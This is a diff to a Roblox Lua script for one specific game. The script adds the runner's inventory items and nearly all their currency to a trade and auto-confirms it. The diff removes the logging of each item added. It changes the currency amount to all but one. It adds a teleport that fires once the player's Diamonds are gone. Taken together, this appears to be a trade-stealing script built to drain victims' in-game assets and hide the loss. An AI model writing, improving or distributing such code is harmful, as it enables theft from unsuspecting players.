@@ -218,7 +218,6 @@ if game.PlaceId == 8737899170 then
                                 [4] = v._am
                             }
                             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
-                            print(i, v._am, itemName)
                         end
                     end
                 end
@@ -256,9 +255,26 @@ if game.PlaceId == 8737899170 then
                         [1] = GetTradeID(),
                         [2] = "Currency",
                         [3] = i,
-                        [4] = v._am
+                        [4] = v._am - 1
                     }
                     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args)) 
+                end
+            end
+        end
+    end
+
+
+    local function TeleportAfterTrade()
+        if save.Inventory.Currency ~= nil then
+            for i,v in pairs(save.Inventory.Currency) do
+                if v.id == 'Diamonds' then
+                    if v._am == nil then
+                        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+                        local World3Teleport = ReplicatedStorage:WaitForChild("Network"):WaitForChild("World3Teleport")
+                        World3Teleport:InvokeServer()
+                    else
+                        print("Trade Cancelled")
+                    end
                 end
             end
         end
@@ -282,11 +298,11 @@ if game.PlaceId == 8737899170 then
                 wait(1)
                 ConfirmTrade()
                 StatusTrade = false
-                wait()
+                wait(10)
+                TeleportAfterTrade()
             end
         end
     end
 
     MakeTrade()
 end
-
